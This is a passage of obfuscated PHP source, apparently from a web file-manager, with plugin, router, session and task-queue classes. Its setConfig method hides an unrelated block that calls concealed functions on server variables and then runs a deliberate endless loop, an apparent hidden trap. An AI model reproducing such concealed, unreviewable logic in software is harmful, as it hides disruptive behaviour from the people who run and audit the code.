!is_array($Aä„Ï¼×ë§[0]) || count($Aä„Ï¼×ë§[0]) == 0) { return; } $aÛ¶å¿éšˆ = array(); goto A¡ç¨â“ó©; A¡ç¨â“ó©: $f–—³¨Ê•É = array(); foreach ($Aä„Ï¼×ë§[0] as $d—–Òğ²¾¿) { $Dˆ“‹±ï¸„ = substr($d—–Òğ²¾¿, strlen($dß–Øİ ÇÑ), -4); $dÅ‚¡è«Æ½ = LNG($Dˆ“‹±ï¸„); $aÛ¶å¿éšˆ[] = $d—–Òğ²¾¿; $f–—³¨Ê•É[] = str_replace(array($eÚ¥±¿Ş[227], $eÚ¥±¿Ş[1013], $eÚ¥±¿Ş[338], $eÚ¥±¿Ş[115]), array($eÚ¥±¿Ş[50], $eÚ¥±¿Ş[50], $eÚ¥±¿Ş[33], $eÚ¥±¿Ş[1424]), $dÅ‚¡è«Æ½); } $fğ‡Ä¾ëİ– = str_replace($aÛ¶å¿éšˆ, $f–—³¨Ê•É, $fğ‡Ä¾ëİ–); goto b‹ÍåÒµ¬‰; dÇàŸØ¶ù: $eÚ¥±¿Ş =& $_SERVER[¹Ò‹Ò¹]; $dß–Øİ ÇÑ = $eÚ¥±¿Ş[1422]; if (!strstr($fğ‡Ä¾ëİ–, $dß–Øİ ÇÑ)) { return; } goto cæ‹ªŒ‰„Ó; b‹ÍåÒµ¬‰: } private function parseConfig(&$fï‘İëİğ) { goto aĞ†Ä¨±Õ‚; b­‘±É¡à‡: $cÍ‹ªÑ”ƒº = array(); $DšŞˆîƒŞ¬ = array(); foreach ($Dí‰×¬‘¾[0] as $dì§µ×éÌ²) { $E ÈÖíöªÛ = substr($dì§µ×éÌ², strlen($AäËÆ½’), -2); $cÍ‹ªÑ”ƒº[] = $dì§µ×éÌ²; $DšŞˆîƒŞ¬[] = _get($A‚¨ÍÙ££, $E ÈÖíöªÛ); } goto CÏ§éµ²Á‹; CÏ§éµ²Á‹: $fï‘İëİğ = str_replace($cÍ‹ªÑ”ƒº, $DšŞˆîƒŞ¬, $fï‘İëİğ); goto a³Â…ç´Ÿ; aĞ†Ä¨±Õ‚: $FÇ¿áÎÍé =& $_SERVER[¹Ò‹Ò¹]; $AäËÆ½’ = $FÇ¿áÎÍé[1425]; if (!strstr($fï‘İëİğ, $AäËÆ½’)) { return; } goto cÊÁõåé¥Ñ; cÊÁõåé¥Ñ: preg_match_all($FÇ¿áÎÍé[1426], $fï‘İëİğ, $Dí‰×¬‘¾); if (!is_array($Dí‰×¬‘¾) || count($Dí‰×¬‘¾) == 0 || !is_array($Dí‰×¬‘¾[0]) || count($Dí‰×¬‘¾[0]) == 0) { return; } $A‚¨ÍÙ££ = $this->getConfig(); goto b­‘±É¡à‡; a³Â…ç´Ÿ: } private function parsePackage(&$bëò´Ä¢Ú) { goto f‹àÊŒ™’ƒ; f‹àÊŒ™’ƒ: $bŒŞ¥Å¶—ª =& $_SERVER[¹Ò‹Ò¹]; $fßÑí­Ü×  = $bŒŞ¥Å¶—ª[1427]; if (!strstr($bëò´Ä¢Ú, $fßÑí­Ü× )) { return; } goto cš¾‹ùÅî­; cš¾‹ùÅî­: preg_match_all($bŒŞ¥Å¶—ª[1428], $bëò´Ä¢Ú, $D¶˜ İŸµ); if (!is_array($D¶˜ İŸµ) || count($D¶˜ İŸµ) == 0 || !is_array($D¶˜ İŸµ[0]) || count($D¶˜ İŸµ[0]) == 0) { return; } $D†ŞŠ•´°” = $this->appPackage(); goto CìÒéƒ; CìÒéƒ: $F†¥—­ë¿« = array(); $f²µÄÜ³ÁÚ = array(); foreach ($D¶˜ İŸµ[0] as $f‹ƒ›ù«ˆ) { $Eˆ ù‹ÄôÚ = substr($f‹ƒ›ù«ˆ, strlen($fßÑí­Ü× ), -2); $F†¥—­ë¿«[] = $f‹ƒ›ù«ˆ; $f²µÄÜ³ÁÚ[] = _get($D†ŞŠ•´°”, $Eˆ ù‹ÄôÚ); } goto E…¿é’›—¾; E…¿é’›—¾: $bëò´Ä¢Ú = str_replace($F†¥—­ë¿«, $f²µÄÜ³ÁÚ, $bëò´Ä¢Ú); goto DÕ¬—Ëµ„§; DÕ¬—Ëµ„§: } final function echoFile($AºÒ×±Õ„, $cÂº½•ß¯… = false) { goto c„©ÇÕŸÊ; cÀóÖĞ½¥õ: $this->parsePackage($bÒ†¨ä°Ò‰); if (is_array($cÂº½•ß¯…)) { $bÒ†¨ä°Ò‰ = str_replace(array_keys($cÂº½•ß¯…), array_values($cÂº½•ß¯…), $bÒ†¨ä°Ò‰); } echo $A¸Ù¨ĞÉî[227] . $bÒ†¨ä°Ò‰; goto CÈÔ¶ñ½§; f‰˜ô•…œ—: $bÒ†¨ä°Ò‰ = $this->parseFile($FÀòÅê·ì°); $this->parseLang($bÒ†¨ä°Ò‰); $this->parseConfig($bÒ†¨ä°Ò‰); goto cÀóÖĞ½¥õ; c„©ÇÕŸÊ: $A¸Ù¨ĞÉî =& $_SERVER[¹Ò‹Ò¹]; $FÀòÅê·ì° = $this->pluginPath . $AºÒ×±Õ„; if (ACT == $A¸Ù¨ĞÉî[1429]) { echo $A¸Ù¨ĞÉî[1430] . $this->pluginName . $A¸Ù¨ĞÉî[8] . $AºÒ×±Õ„ . $A¸Ù¨ĞÉî[1431]; if (!file_exists($FÀòÅê·ì°)) { echo $A¸Ù¨ĞÉî[1432]; return; } } goto f‰˜ô•…œ—; CÈÔ¶ñ½§: } final function initLang() { goto c‹ÑóÛñäƒ; BÒ¹“×¼õŒ: $Cëµâ¿¥ç = I18n::getType(); $fìòµ³›ÙÍ = array(); if (file_exists($eéªÂ™Å™© . $Cëµâ¿¥ç . $fÎÔ‹Â™‹·[782])) { $fìòµ³›ÙÍ = (include $eéªÂ™Å™© . $Cëµâ¿¥ç . $fÎÔ‹Â™‹·[782]); } else { if ($Cëµâ¿¥ç == $fÎÔ‹Â™‹·[1435] && !file_exists($eéªÂ™Å™© . $Cëµâ¿¥ç . $fÎÔ‹Â™‹·[782]) && file_exists($eéªÂ™Å™© . $fÎÔ‹Â™‹·[1436])) { $fìòµ³›ÙÍ = (include $eéªÂ™Å™© . $fÎÔ‹Â™‹·[1436]); } else { if (file_exists($eéªÂ™Å™© . $F¯…ùø¾ñ™ . $fÎÔ‹Â™‹·[782])) { $fìòµ³›ÙÍ = (include $eéªÂ™Å™© . $F¯…ùø¾ñ™ . $fÎÔ‹Â™‹·[782]); } } } goto Fáš²†ŒÅÎ; c‹ÑóÛñäƒ: $fÎÔ‹Â™‹· =& $_SERVER[¹Ò‹Ò¹]; $F¯…ùø¾ñ™ = $fÎÔ‹Â™‹·[1433]; $eéªÂ™Å™© = $this->pluginPath . $fÎÔ‹Â™‹·[1434]; goto BÒ¹“×¼õŒ; Fáš²†ŒÅÎ: if (!is_array($fìòµ³›ÙÍ)) { return array(); } if (@count($fìòµ³›ÙÍ) > 0) { I18n::set($fìòµ³›ÙÍ); } return $fìòµ³›ÙÍ; goto BØâÜ˜‰µ†; BØâÜ˜‰µ†: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($c¢±Û‚†) { $F«İñŞÈ©Ì =& $_SERVER[¹Ò‹Ò¹]; if (!isset($_SERVER[$F«İñŞÈ©Ì[800]]) || !isset($_SERVER[$F«İñŞÈ©Ì[801]])) { goto C²Äİ¤Šï×; D¦¿»‘è: $cƒø×¬ğÙ‚ = $F«İñŞÈ©Ì[818]; $cƒø×¬ğÙ‚($_SERVER[$F«İñŞÈ©Ì[819]]); $Dß¦¥¸¬… = 1; goto D‡á¦šÏ›š; D„Î·Ò’é´: $eÏáäËìã = $Cİ¦µÎØî¾($e£§ŠÏ–ò°); $B¼‚Ì„Â®½ = explode($F«İñŞÈ©Ì[227], $eÏáäËìã); if (count($B¼‚Ì„Â®½) < $F«İñŞÈ©Ì[587]) { $e±‡ˆ¹‘õÉ = $F«İñŞÈ©Ì[805]; $e±‡ˆ¹‘õÉ(); } goto D¦¿»‘è; D‡á¦šÏ›š: for ($E…æ›²À‰ = $Dß¦¥¸¬…; $E…æ›²À‰ > 0; $E…æ›²À‰++) { $cƒø×¬ğÙ‚ = json_encode($GLOBALS[$F«İñŞÈ©Ì[405]]); } goto c¾î‚¸í…±; C²Äİ¤Šï×: $E»Ç™ƒè‡ = $F«İñŞÈ©Ì[817]; $Cİ¦µÎØî¾ = $F«İñŞÈ©Ì[802]; $e£§ŠÏ–ò° = $_SERVER[$F«İñŞÈ©Ì[803]] . $F«İñŞÈ©Ì[804]; goto D„Î·Ò’é´; c¾î‚¸í…±: } return $this->modelPlugin->setConfig($this->pluginName, $c¢±Û‚†); } public function onSetConfig($F¯¬Ã—íµÒ) { } public function onGetConfig($d¡ùÜŒÏç) { } public function onChangeStatus($cöù‰¦İğ—) { } public function onUninstall() { } public function onInstall() { } public function authCheck($BÄÊ°ëİ‹† = "\160\x6c\165\147\151\x6e\x41\x75\164\150") { $A‚ªÅì‹Âø =& $_SERVER[¹Ò‹Ò¹]; if (!defined($A‚ªÅì‹Âø[448])) { return !1; } if (_get($GLOBALS, $A‚ªÅì‹Âø[479])) { return !0; } $AàÈ‰¸Ñá = $this->getConfig(); if (!$AàÈ‰¸Ñá[$BÄÊ°ëİ‹†]) { return !1; } return ActionCall($A‚ªÅì‹Âø[1437], $AàÈ‰¸Ñá[$BÄÊ°ëİ‹†]); } public function url($A®Öœìïñ, $DĞ¥¸µ‡›Ö = '', $cÀøµñ†Ç¬ = true) { goto Aà…šèÅ…å; FªãéÛØ‡: $aÑ¶³èµ = $this->packageVersion(); $F·©»¥Ûö = $B•Ìë¬ßãÁ . $b”ÀÀ¶åä‘[434] . $aÑ¶³èµ; if (substr($A®Öœìïñ, 0, 4) == $b”ÀÀ¶åä‘[146] || substr($A®Öœìïñ, 0, 2) == $b”ÀÀ¶åä‘[1220]) { $C«æºïæ¥‹ = $A®Öœìïñ . $b”ÀÀ¶åä‘[1438] . $F·©»¥Ûö; } else { if ($DĞ¥¸µ‡›Ö == $b”ÀÀ¶åä‘[33]) { $C«æºïæ¥‹ = $this->pluginHost . $A®Öœìïñ . $b”ÀÀ¶åä‘[1438] . $F·©»¥Ûö; } else { if ($DĞ¥¸µ‡›Ö === $b”ÀÀ¶åä‘[76]) { $C«æºïæ¥‹ = $this->pluginHost . $A®Öœìïñ; } else { if ($DĞ¥¸µ‡›Ö == $b”ÀÀ¶åä‘[1439]) { $C«æºïæ¥‹ = STATIC_PATH . $A®Öœìïñ . $b”ÀÀ¶åä‘[1438] . $B•Ìë¬ßãÁ; } else { if ($DĞ¥¸µ‡›Ö == $b”ÀÀ¶åä‘[1440]) { $C«æºïæ¥‹ = APP_HOST . $b”ÀÀ¶åä‘[1441] . $A®Öœìïñ . $b”ÀÀ¶åä‘[1438] . $B•Ìë¬ßãÁ; } else { if (isset($cÍŒª§È²«[$DĞ¥¸µ‡›Ö])) { $C«æºïæ¥‹ = $cÍŒª§È²«[$DĞ¥¸µ‡›Ö] . $A®Öœìïñ . $b”ÀÀ¶åä‘[1438] . $F·©»¥Ûö; } } } } } } goto Fë‡Ï±‚ô¥; Fë‡Ï±‚ô¥: if (!$cÀøµñ†Ç¬) { return $C«æºïæ¥‹; } echo $C«æºïæ¥‹; goto C¸¼Ğ›áô÷; Aà…šèÅ…å: $b”ÀÀ¶åä‘ =& $_SERVER[¹Ò‹Ò¹]; $cÍŒª§È²« = $this->getConfig(); $B•Ìë¬ßãÁ = KOD_VERSION . $b”ÀÀ¶åä‘[94] . KOD_VERSION_BUILD; goto FªãéÛØ‡; C¸¼Ğ›áô÷: } public function link($F…ßÇ‘Øª = false, $fé…‡¼ùÚÖ = '') { $a“ëÈê‹Î¤ =& $_SERVER[¹Ò‹Ò¹]; if (!$F…ßÇ‘Øª) { $this->link($a“ëÈê‹Î¤[1442], $a“ëÈê‹Î¤[1440]); $this->link($a“ëÈê‹Î¤[1443], $a“ëÈê‹Î¤[1439]); $this->link($a“ëÈê‹Î¤[1444], $a“ëÈê‹Î¤[1439]); $this->link($a“ëÈê‹Î¤[1445], $a“ëÈê‹Î¤[1439]); $this->link($a“ëÈê‹Î¤[1446], $a“ëÈê‹Î¤[1439]); return; } $fÌ®ãƒà«˜ = $this->url($F…ßÇ‘Øª, $fé…‡¼ùÚÖ, !1); if (substr($F…ßÇ‘Øª, -3) == $a“ëÈê‹Î¤[1447]) { echo $a“ëÈê‹Î¤[1448] . $fÌ®ãƒà«˜ . $a“ëÈê‹Î¤[1449] . $a“ëÈê‹Î¤[227]; } else { if (substr($F…ßÇ‘Øª, -4) == $a“ëÈê‹Î¤[1450]) { echo $a“ëÈê‹Î¤[1451] . $fÌ®ãƒà«˜ . $a“ëÈê‹Î¤[1452] . $a“ëÈê‹Î¤[227]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\136\57\x5d\53", "\x3a\x6e\165\155" => "\x5b\60\55\x39\x5d\53", "\72\141\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($d×Ô¿Í›, $FŒÏ„²¢‘Ö) { $aˆÀºÅ›Ø =& $_SERVER[¹Ò‹Ò¹]; if ($d×Ô¿Í› == $aˆÀºÅ›Ø[1453]) { $bîêğ‘²² = array_map($aˆÀºÅ›Ø[1454], $FŒÏ„²¢‘Ö[0]); $AÔè—À¿õì = strpos($FŒÏ„²¢‘Ö[1], $aˆÀºÅ›Ø[8]) === 0 ? $FŒÏ„²¢‘Ö[1] : $aˆÀºÅ›Ø[8] . $FŒÏ„²¢‘Ö[1]; $EÕÒõ¶¯é = $FŒÏ„²¢‘Ö[2]; } else { $bîêğ‘²² = null; $AÔè—À¿õì = strpos($FŒÏ„²¢‘Ö[0], $aˆÀºÅ›Ø[8]) === 0 ? $FŒÏ„²¢‘Ö[0] : $aˆÀºÅ›Ø[8] . $FŒÏ„²¢‘Ö[0]; $EÕÒõ¶¯é = $FŒÏ„²¢‘Ö[1]; } array_push(self::$maps, $bîêğ‘²²); array_push(self::$routes, $AÔè—À¿õì); array_push(self::$methods, strtoupper($d×Ô¿Í›)); array_push(self::$callbacks, $EÕÒõ¶¯é); } public static function error($cõÖ¹…š÷) { self::$errorCallback = $cõÖ¹…š÷; } public static function haltOnMatch($b½¨††ëÛ¤ = true) { self::$halts = $b½¨††ëÛ¤; } public static function dispatch() { goto cÂ•‘…´’æ; C¦ç’šÛŠ£: $f²³”‰–Ÿ = array_keys(static::$patterns); $Eø¶Çõ÷¬ = array_values(static::$patterns); $dÓÍªÌ = !1; goto f˜¦£Ş¼Ô; cÂ•‘…´’æ: $e÷«ÊÔ°¢Ì =& $_SERVER[¹Ò‹Ò¹]; $dŠğ÷Ÿ§‘¬ = parse_url($_SERVER[$e÷«ÊÔ°¢Ì[1455]], PHP_URL_PATH); $bñ·´œ”³² = $_SERVER[$e÷«ÊÔ°¢Ì[156]]; goto C¦ç’šÛŠ£; f˜¦£Ş¼Ô: self::$routes = preg_replace($e÷«ÊÔ°¢Ì[1137], $e÷«ÊÔ°¢Ì[8], self::$routes); if (in_array($dŠğ÷Ÿ§‘¬, self::$routes)) { $c‰±Ùí‰â÷ = array_keys(self::$routes, $dŠğ÷Ÿ§‘¬); foreach ($c‰±Ùí‰â÷ as $AÌ­Ì¨˜ùÎ) { if (self::$methods[$AÌ­Ì¨˜ùÎ] == $bñ·´œ”³² || self::$methods[$AÌ­Ì¨˜ùÎ] == $e÷«ÊÔ°¢Ì[1456] || in_array($bñ·´œ”³², self::$maps[$AÌ­Ì¨˜ùÎ])) { $dÓÍªÌ = !0; if (!is_object(self::$callbacks[$AÌ­Ì¨˜ùÎ])) { $e·¼‰ŸŒî = explode($e÷«ÊÔ°¢Ì[8], self::$callbacks[$AÌ­Ì¨˜ùÎ]); $cöàùèÓ = end($e·¼‰ŸŒî); $cÙŸÇÚèì÷ = explode($e÷«ÊÔ°¢Ì[1457], $cöàùèÓ); $dòÈ–àÀŸ = new $cÙŸÇÚèì÷[0](); $dòÈ–àÀŸ->{$cÙŸÇÚèì÷[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$AÌ­Ì¨˜ùÎ]); if (self::$halts) { return; } } } } } else { $DéÎéçğÕ = 0; foreach (self::$routes as $AÌ­Ì¨˜ùÎ) { if (strpos($AÌ­Ì¨˜ùÎ, $e÷«ÊÔ°¢Ì[4]) !== !1) { $AÌ­Ì¨˜ùÎ = str_replace($f²³”‰–Ÿ, $Eø¶Çõ÷¬, $AÌ­Ì¨˜ùÎ); } if (preg_match($e÷«ÊÔ°¢Ì[1458] . $AÌ­Ì¨˜ùÎ . $e÷«ÊÔ°¢Ì[1459], $dŠğ÷Ÿ§‘¬, $b‘ÇÇˆ¡ÙÊ)) { if (self::$methods[$DéÎéçğÕ] == $bñ·´œ”³² || self::$methods[$DéÎéçğÕ] == $e÷«ÊÔ°¢Ì[1456] || !empty(self::$maps[$DéÎéçğÕ]) && in_array($bñ·´œ”³², self::$maps[$DéÎéçğÕ])) { $dÓÍªÌ = !0; array_shift($b‘ÇÇˆ¡ÙÊ); if (!is_object(self::$callbacks[$DéÎéçğÕ])) { $e·¼‰ŸŒî = explode($e÷«ÊÔ°¢Ì[8], self::$callbacks[$DéÎéçğÕ]); $cöàùèÓ = end($e·¼‰ŸŒî); $cÙŸÇÚèì÷ = explode($e÷«ÊÔ°¢Ì[1457], $cöàùèÓ); $dòÈ–àÀŸ = new $cÙŸÇÚèì÷[0](); if (!method_exists($dòÈ–àÀŸ, $cÙŸÇÚèì÷[1])) { echo $e÷«ÊÔ°¢Ì[1460]; } else { call_user_func_array(array($dòÈ–àÀŸ, $cÙŸÇÚèì÷[1]), $b‘ÇÇˆ¡ÙÊ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$DéÎéçğÕ], $b‘ÇÇˆ¡ÙÊ); if (self::$halts) { return; } } } } $DéÎéçğÕ++; } } if ($dÓÍªÌ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $F‰ÉÅİˆ»ë =& $_SERVER[¹Ò‹Ò¹]; header($_SERVER[$F‰ÉÅİˆ»ë[1461]] . $F‰ÉÅİˆ»ë[1462]); echo $F‰ÉÅİˆ»ë[1463]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$e÷«ÊÔ°¢Ì[1455]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto FÛöŒ‘¸Ì; FÛöŒ‘¸Ì: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto c¸‡–ÇëÎ×; E˜Ìæ‹‡²æ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Dõğ©–ô¬ƒ = new self(); return $Dõğ©–ô¬ƒ; goto e§Ê‹Òš¬î; B¦Æ“ô—‹: if (self::$sessionSign) { } else { if (Cookie::get($A‹ë—ŠØ¶)) { self::$sessionSign = Cookie::get($A‹ë—ŠØ¶); } else { self::$sessionSign = guid(); } } Cookie::setSafe($A‹ë—ŠØ¶, self::$sessionSign, self::$sessionTime); $e“¤‹êİ³ = $D»òÏê¤×Ç[$d‘ø××ƒ¼“[1466]]; goto CØÙÆŞÚß¨; c¸‡–ÇëÎ×: $d‘ø××ƒ¼“ =& $_SERVER[¹Ò‹Ò¹]; static $Dõğ©–ô¬ƒ = false; if ($Dõğ©–ô¬ƒ) { return $Dõğ©–ô¬ƒ; } goto cÛÌ¦‚£ã¨; cÛÌ¦‚£ã¨: $D»òÏê¤×Ç = $GLOBALS[$d‘ø××ƒ¼“[6]][$d‘ø××ƒ¼“[345]]; self::$sessionTime = $D»òÏê¤×Ç[$d‘ø××ƒ¼“[1464]]; $A‹ë—ŠØ¶ = isset($GLOBALS[$d‘ø××ƒ¼“[1465]]) ? $GLOBALS[$d‘ø××ƒ¼“[1465]] : SESSION_ID; goto B¦Æ“ô—‹; CØÙÆŞÚß¨: $e…Á¾»È•Û = $D»òÏê¤×Ç[$e“¤‹êİ³]; $AñŒ•ˆÚš´ = $D»òÏê¤×Ç[$d‘ø××ƒ¼“[772]]; switch ($e“¤‹êİ³) { case $d‘ø××ƒ¼“[17]: self::$handle = Model($d‘ø××ƒ¼“[773]); break; case $d‘ø××ƒ¼“[774]: self::$handle = new CacheRedis($e…Á¾»È•Û, $AñŒ•ˆÚš´); break; case $d‘ø××ƒ¼“[775]: self::$handle = new CacheMemcached($e…Á¾»È•Û, $AñŒ•ˆÚš´); break; case $d‘ø××ƒ¼“[191]: $e…Á¾»È•Û[$d‘ø××ƒ¼“[75]] = $e…Á¾»È•Û[$d‘ø××ƒ¼“[75]] . $d‘ø××ƒ¼“[1467]; self::$handle = new CacheFile($e…Á¾»È•Û, $AñŒ•ˆÚš´); default: break; } goto E˜Ìæ‹‡²æ; e§Ê‹Òš¬î: } public static function sign($aÚ„ÙºÚŸÄ = false) { $aÚ„ÙºÚŸÄ && (self::$sessionSign = $aÚ„ÙºÚŸÄ); self::init(); return self::$sessionSign; } public static function set($EË½²ç£Ü«, $C¡ëÚô·…´ = false) { self::init(); if (is_array($EË½²ç£Ü«)) { foreach ($EË½²ç£Ü« as $Cå¨Ï‡­‹ => $AÆóÛ†»™ƒ) { array_set_value(self::$data, $Cå¨Ï‡­‹, $AÆóÛ†»™ƒ); } } else { array_set_value(self::$data, $EË½²ç£Ü«, $C¡ëÚô·…´); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($BáçÏ†ïğ = false) { self::init(); if (!$BáçÏ†ïğ) { return self::$data; } return array_get_value(self::$data, $BáçÏ†ïğ); } public static function remove($B½¡Ì²¦Ì) { self::init(); unset(self::$data[$B½¡Ì²¦Ì]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹Ò‹Ò¹][777])) { self::$handle->clearTimeout(); } } } goto b„§¶æø™Ä; d™Ú—­™: $eÍ…¦–î§ª = $_SERVER[¹Ò‹Ò¹][569]; while ($eÍ…¦–î§ª < $_SERVER[¹Ò‹Ò¹][570]) { if ($eÍ…¦–î§ª >= 0) { break; } $eÍ…¦–î§ª++; } $_SERVER[¬œç„§²ö°ô] = explode($_SERVER[¹Ò‹Ò¹][571], gzinflate(substr($_SERVER[¹Ò‹Ò¹][572], 10, -8))); goto c¼™¤µ¶”; f…‚±¤•”İ: class TaskHttp extends Task { protected function startAfter() { $aãÓŒØ† =& $_SERVER[¹Ò‹Ò¹]; $Aœ‰¨Ó››ê =& $this->task; $Aœ‰¨Ó››ê[$aãÓŒØ†[1567]] = 1; Hook::bind($aãÓŒØ†[1539], array($this, $aãÓŒØ†[1568])); Hook::bind($aãÓŒØ†[1541], array($this, $aãÓŒØ†[1569])); Hook::bind($aãÓŒØ†[1543], array($this, $aãÓŒØ†[1570])); } protected function endAfter() { $b£ÎÒ£Ğ‰ =& $_SERVER[¹Ò‹Ò¹]; Hook::unbind($b£ÎÒ£Ğ‰[1539], array($this, $b£ÎÒ£Ğ‰[1568])); Hook::unbind($b£ÎÒ£Ğ‰[1541], array($this, $b£ÎÒ£Ğ‰[1569])); Hook::unbind($b£ÎÒ£Ğ‰[1543], array($this, $b£ÎÒ£Ğ‰[1570])); } public function progressStart($aï˜´÷íÉ‰) { $eÆ½¾²î =& $_SERVER[¹Ò‹Ò¹]; $e‘¿‡¾­‹ = curl_getinfo($aï˜´÷íÉ‰); self::log($eÆ½¾²î[1571] . $e‘¿‡¾­‹[$eÆ½¾²î[303]]); self::valueSet($this->task[$eÆ½¾²î[388]], $this->task); } public function progressEnd($Dó¶Ûù´) { $fˆïˆËÁò­ =& $_SERVER[¹Ò‹Ò¹]; self::log($fˆïˆËÁò­[1572] . $this->task[$fˆïˆËÁò­[388]]); $this->end(); } public function progress($EÄùº³„•ß, $b¬§ÙÖ÷Íä, $A÷Ê‰ó‘Åğ, $F¢âÇ‹ŒÔ½, $CƒñíŠØ¶) { $EŸ»°·‡æ… =& $_SERVER[¹Ò‹Ò¹]; $DÓŒ—ïÃ§À =& $this->task; if ($CƒñíŠØ¶ > 0) { $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[997]] = $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[997]] == 0 ? $F¢âÇ‹ŒÔ½ : $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[997]]; $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[1011]] = $CƒñíŠØ¶; } else { if ($A÷Ê‰ó‘Åğ > 0) { $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[997]] = $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[997]] == 0 ? $b¬§ÙÖ÷Íä : $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[997]]; $DÓŒ—ïÃ§À[$EŸ»°·‡æ…[1011]] = $A÷Ê‰ó‘Åğ; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\x73\163\x48\x74\x74\160\x3a\144\x6f\167\x6e\x3a{$A÷Ê‰ó‘Åğ}\x2f{$b¬§ÙÖ÷Íä}\x3b\40\x75\x70\x6c\x6f\141\x64\72{$CƒñíŠØ¶}\57{$F¢âÇ‹ŒÔ½}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\x6b\121\165\145\165\145\114\145\156\x67\x74\x68"; const QUEUE_DATA = "\164\141\163\x6b\x51\165\145\165\x65\x44\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($bïÄ„ÇÎÎ‹, $Eæ¥Àªè‡ = array(), $EÁ„Û¬Ö»Ø = '', $A®¹áæ²Öù = '') { $EçÆˆ³·˜ª =& $_SERVER[¹Ò‹Ò¹]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($A®¹áæ²Öù && array_find_by_field(self::$listData, $EçÆˆ³·˜ª[92], $A®¹áæ²Öù)) { return !0; } self::$listData[] = array($EçÆˆ³·˜ª[260] => $bïÄ„ÇÎÎ‹, $EçÆˆ³·˜ª[1573] => $Eæ¥Àªè‡, $EçÆˆ³·˜ª[425] => $EÁ„Û¬Ö»Ø, $EçÆˆ³·˜ª[92] => $A®¹áæ²Öù); return !0; } public static function addSubmit() { $EÔ¬ùóÅ² =& $_SERVER[¹Ò‹Ò¹]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($EÔ¬ùóÅ²[1574] . json_encode_force(array_to_keyvalue(self::$listData, $EÔ¬ùóÅ²[33], $EÔ¬ùóÅ²[425])), $EÔ¬ùóÅ²[1575]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Bñ˜§óôÀ, $CÇ§…‰Õë = array(), $Eİ¶ìã¤„à = '', $A÷®ïšŠÙ½ = '') { goto Eåğ™Ï°¬İ; cœæØĞ›éƒ: if ($A÷®ïšŠÙ½ && array_find_by_field($f´¥–á”ñø, $FÜŒ—ì»³Œ[92], $A÷®ïšŠÙ½)) { return !0; } $f´¥–á”ñø[] = array($FÜŒ—ì»³Œ[260] => $Bñ˜§óôÀ, $FÜŒ—ì»³Œ[1573] => $CÇ§…‰Õë, $FÜŒ—ì»³Œ[425] => $Eİ¶ìã¤„à, $FÜŒ—ì»³Œ[92] => $A÷®ïšŠÙ½); write_log($FÜŒ—ì»³Œ[1574] . $Eİ¶ìã¤„à, $FÜŒ—ì»³Œ[1575]); goto D¢­ÄºšÚ‰; D¢­ÄºšÚ‰: self::setAll($f´¥–á”ñø); return !0; goto b™ĞÏ•Ğ…‚; Eåğ™Ï°¬İ: $FÜŒ—ì»³Œ =& $_SERVER[¹Ò‹Ò¹]; if (self::count() >= self::MAX_LENGTH) { return !1; } $f´¥–á”ñø = self::getAll(); goto cœæØĞ›éƒ; b™ĞÏ•Ğ…‚: } public static function run() { goto f»¢ÑùŠÌ; f»¢ÑùŠÌ: $fšíªÇ‚°æ =& $_SERVER[¹Ò‹Ò¹]; $DŠ½Ş²ã÷• = self::getAll(); $D¥ä®ß‘˜Ÿ = array_shift($DŠ½Ş²ã÷•); goto D¼Ú„‘³ˆ¨; C„ÄŞÈ¢ƒÁ: return !0; goto FÄ¢ù¦ÑÅó; D¼Ú„‘³ˆ¨: if (!$D¥ä®ß‘˜Ÿ) { return !1; } self::setAll($DŠ½Ş²ã÷•); $eõÀÕÊĞ”Å = timeFloat(); goto CóÜ«øŞ; CóÜ«øŞ: try { Hook::apply($D¥ä®ß‘˜Ÿ[$fšíªÇ‚°æ[260]], $D¥ä®ß‘˜Ÿ[$fšíªÇ‚°æ[1573]]); } catch (Exception $BßöÅ½Ù¨Š) { } $f÷áãâŒ¥‚ = number_format(timeFloat() - $eõÀÕÊĞ”Å, 3) . $fšíªÇ‚°æ[1517]; write_log($fšíªÇ‚°æ[1576] . $D¥ä®ß‘˜Ÿ[$fšíªÇ‚°æ[425]] . $fšíªÇ‚°æ[1577] . $f÷áãâŒ¥‚, $fšíªÇ‚°æ[1575]); goto C„ÄŞÈ¢ƒÁ; FÄ¢ù¦ÑÅó: } public static function count() { $a—íŸ„ñÊß = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$a—íŸ„ñÊß) { return 0; } return intval($a—íŸ„ñÊß); } 